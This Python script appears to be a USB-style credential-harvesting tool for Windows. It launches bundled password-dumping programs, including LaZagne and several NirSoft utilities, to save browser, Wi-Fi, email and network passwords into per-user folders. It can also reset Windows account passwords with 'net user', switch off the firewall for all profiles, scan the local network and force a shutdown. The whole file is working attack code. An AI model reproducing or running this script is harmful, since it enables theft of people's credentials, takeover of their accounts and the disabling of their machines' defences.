import os, sys, ctypes, getpass, socket
exec(open("./config.py").read())


# setting up directory
usr = getpass.getuser()
if not os.path.exists("hosts/" + usr):
    os.makedirs("hosts/" + usr)
    root = usr
elif duplicate_exec:
    usr_x = 1
    usr_ct = 2
    while usr_x:
        usr_ct = str(usr_ct)
        if not os.path.exists("hosts/"+ usr + " (" + usr_ct + ")"):
            os.makedirs("hosts/" + usr + " (" + usr_ct + ")")
            root = usr + " (" + usr_ct + ")"
            usr_x = 0
        else:
            usr_ct = int(usr_ct)
            usr_ct += 1
else:
    sys.exit()

rootdir = "..\hosts\\" + root + "\\"


# checking internet connectivity
try:
    socket.create_connection(("www.google.com", 80))
    inet = 1
except OSError:
    pass
    inet = 0

os.chdir("payloads")
# password recovery
if browser_pwds:
    os.popen("WebBrowserPassView.exe /shtml " + '"' + rootdir + "Browser passwords.html" + '"').read()
if wireless_keys:
    os.popen("WirelessKeyView.exe /shtml " + '"' + rootdir + "Wireless passwords.html" + '"').read()
if email_pst_pwds:
    os.popen("PstPassword.exe /shtml " + '"' + rootdir + "Email pst passwords.html" + '"').read()
if mail_pwds:
    os.popen("mailpv.exe /shtml " + '"' + rootdir + "Mail passwords.html" + '"').read()
if network_pwds:
    os.popen("netpass.exe /shtml " + '"' + rootdir + "Network passwords.html" + '"').read()
if msn_pwds:
    os.popen("mspass.exe /shtml " + '"' + rootdir + "MSN passwords.html" + '"').read()
if dialup_pwds:
    os.popen("Dialupass.exe /shtml " + '"' + rootdir + "Dialup passwords.html" + '"').read()
if lazagne:
    os.popen("laZagne.exe all > " + '"' + rootdir + "laZagne.txt" + '"').read()
    
# recon
if network_scan and inet:
    os.popen("WNetWatcher.exe /shtml " + '"' + rootdir + "Network scan.html" + '"').read()


# changing nt password
if change_nt_pwd["current_acc_controller"]:
    os.popen(r"net user %username% " + '"' + change_nt_pwd["current_acc_pwd"] + '"').read()
if change_nt_pwd["diff_acc_controller"]:
    os.popen(r"net user " + '"' + change_nt_pwd["diff_acc_usr"] + '" ' + '"' + change_nt_pwd["diff_acc_pwd"] + '"').read()

# Network based executions
if deactivate_firewall:
    os.popen(r"netsh advfirewall set allprofiles state off").read()
if activate_firewall:
    os.popen(r"netsh advfirewall set allprofiles state on").read()
if release_net_adapters:
    os.popen(r"ipconfig /release").read()
if renew_net_adapters:
    os.popen(r"ipconfig /renew").read()
if flush_dns:
    os.popen(r"ipconfig /flushdns").read()
if register_dns:
    os.popen(r"ipconfig /registerdns").read()

if batch_info:
    os.popen(r"bi " + '"' + root + '" ' + '"' + rootdir + '"').read()

# msg box
if msgbox["controller"]:
    ctypes.windll.user32.MessageBoxW(0, msgbox["msg"], msgbox["title"], msgbox["buttons"])

# shutdown code
if power["controller"]:
    if power["mode"] != "":
        shutdown = "shutdown -" + power['mode']
        if power["comment"] != "":
            shutdown = shutdown + " -c " + "\"" + power['comment'] + "\""
        if power["timeout"] != "":
                shutdown = shutdown + " -t " + power['timeout']
        os.popen(shutdown).read()